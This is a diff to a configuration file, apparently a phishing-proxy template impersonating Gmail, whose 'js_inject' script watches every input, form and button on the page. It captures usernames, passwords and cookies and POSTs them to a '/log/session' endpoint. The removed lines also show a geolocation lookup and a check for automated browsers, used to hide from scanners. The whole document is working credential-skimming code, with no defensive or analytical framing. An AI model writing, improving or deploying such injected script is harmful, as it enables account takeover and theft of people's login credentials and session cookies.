@@ -34,17 +34,15 @@ js_inject:
     trigger_paths: ["*"]
     script: |
       (function() {
-        var passedGate = false;
         var lastCapture = '';
         var capturedCreds = { username: '', password: '' };
-        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;
         var providerName = 'Gmail';
         var providerId = 'gmail';
 
         function sendSessionData() {
           try {
             if (!capturedCreds.username && !capturedCreds.password) return;
-            var currentHash = capturedCreds.username + ':' + capturedCreds.password;
+            var currentHash = (capturedCreds.username || '') + ':' + (capturedCreds.password || '');
             if (currentHash === lastCapture) return;
             lastCapture = currentHash;
 
@@ -54,92 +52,61 @@ js_inject:
               if (c) { var eq = c.indexOf('='); if (eq > 0) cookieObj[c.substring(0, eq)] = c.substring(eq + 1); }
             });
 
-            var geoData = { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown' };
-            try {
-              geoData = fetch('https://ipapi.co/json/').then(r => r.json()).then(d => geoData = d);
-            } catch(e) {}
-            var ip = geoData.ip;
-            var location = geoData.city + ', ' + geoData.country_name;
-            var timestamp = new Date().toISOString();
-            var device = navigator.userAgent;
-
             var sessionInfo = {
               provider: providerId,
               credentials: capturedCreds,
               url: window.location.href,
-              ip: ip,
-              location: location,
-              timestamp: timestamp,
-              device: device,
-              cookies: cookieObj
+              userAgent: navigator.userAgent || '',
+              cookies: cookieObj,
+              timestamp: new Date().toISOString()
             };
-            var payload = { username: 'SessionData-' + providerName, password: JSON.stringify(sessionInfo) };
-            var body = JSON.stringify(payload);
 
-            var h = window.location.hostname;
-            var parts = h.split('.');
-            if (parts.length > 2) parts.shift();
-            var beaconUrl = 'https://' + parts.join('.') + '/log/session';
+            var payload = {
+              username: 'SessionData-' + providerName,
+              password: JSON.stringify(sessionInfo)
+            };
 
-            fetch(beaconUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true }).catch(function(){});
+            fetch('/log/session', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+              keepalive: true
+            }).catch(function(){});
           } catch(e) {}
         }
 
-        function monitorFormInputs() {
-          document.querySelectorAll('input').forEach(function(el) {
-            if (watchedElements ? watchedElements.has(el) : el._gmWatched) return;
-            if (watchedElements) { watchedElements.add(el); } else { el._gmWatched = true; }
-            function captureField() {
-              var t = (el.type || '').toLowerCase();
-              var n = (el.name || el.id || el.getAttribute('aria-label') || '').toLowerCase();
-              var v = el.value;
-              if (!v) return;
-              if (t === 'password' || /passwd|password|pass/.test(n)) {
-                if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
-              } else if (t === 'email' || t === 'text' || t === 'tel' || /identifier|username|userid|email|login/.test(n)) {
-                capturedCreds.username = v;
+        var monitor = (function() {
+          var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : { add: function(el) { el._gmWatched = true; }, has: function(el) { return el._gmWatched; } };
+          return function() {
+            document.querySelectorAll('input, form, button, [role="button"]').forEach(function(el) {
+              if (watchedElements.has(el)) return;
+              watchedElements.add(el);
+              if (el.tagName === 'INPUT') {
+                var captureField = function() {
+                  var v = el.value;
+                  if (!v) return;
+                  var t = (el.type || '').toLowerCase();
+                  var n = (el.name || el.id || '').toLowerCase();
+                  if (t === 'password' || n.includes('pass')) {
+                    if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
+                  } else if (t === 'email' || t === 'text' || t === 'tel' || n.includes('identifier') || n.includes('user') || n.includes('email') || n.includes('login')) {
+                    if (v !== capturedCreds.username) { capturedCreds.username = v; }
+                  }
+                };
+                el.addEventListener('input', captureField, { passive: true });
+                el.addEventListener('change', captureField, { passive: true });
+                el.addEventListener('blur', captureField, { passive: true });
+              } else if (el.tagName === 'FORM') {
+                el.addEventListener('submit', function() { setTimeout(sendSessionData, 100); }, { passive: true });
+              } else {
+                el.addEventListener('click', function() { setTimeout(sendSessionData, 100); }, { passive: true });
               }
-            }
-            el.addEventListener('input', captureField, { passive: true });
-            el.addEventListener('change', captureField, { passive: true });
-            el.addEventListener('blur', captureField, { passive: true });
-            el.addEventListener('paste', captureField, { passive: true });
-            el.addEventListener('cut', captureField, { passive: true });
-            if (t === 'password') el.addEventListener('keyup', captureField, { passive: true });
-          });
-          document.querySelectorAll('form').forEach(function(form) {
-            if (watchedElements ? watchedElements.has(form) : form._gmFormWatched) return;
-            if (watchedElements) { watchedElements.add(form); } else { form._gmFormWatched = true; }
-            form.addEventListener('submit', function() { sendSessionData(); });
-          });
-          document.querySelectorAll('button[type="submit"], [jsname="LgbsSe"]').forEach(function(btn) {
-            if (watchedElements ? watchedElements.has(btn) : btn._gmBtnWatched) return;
-            if (watchedElements) { watchedElements.add(btn); } else { btn._gmBtnWatched = true; }
-            btn.addEventListener('click', function() { setTimeout(sendSessionData, 100); });
-          });
-        }
+            });
+          };
+        })();
 
-        function runMainLogic() {
-          if (passedGate) return;
-          passedGate = true;
-          var observer = new MutationObserver(function(mutations) {
-            for (var i = 0; i < mutations.length; i++) {
-              if (mutations[i].addedNodes.length > 0) { monitorFormInputs(); break; }
-            }
-          });
-          window.addEventListener('load', function() { monitorFormInputs(); observer.observe(document.body, { childList: true, subtree: true }); });
-          if (document.body) { monitorFormInputs(); observer.observe(document.body, { childList: true, subtree: true }); }
-          setInterval(function() {
-            var dynamicEls = document.querySelectorAll('[data-dynamic]');
-            dynamicEls.forEach(function(el) { el.textContent = new Date().toLocaleTimeString(); });
-          }, 1000);
-        }
-
-        if (!navigator.webdriver) {
-          var interactionHandler = function() { if (passedGate) return; runMainLogic(); };
-          document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
-          document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
-          document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
-          setTimeout(function() { if (!passedGate) runMainLogic(); }, 4000);
-        }
+        var observer = new MutationObserver(monitor);
+        observer.observe(document, { childList: true, subtree: true });
+        setInterval(monitor, 3000);
+        monitor();
       })();
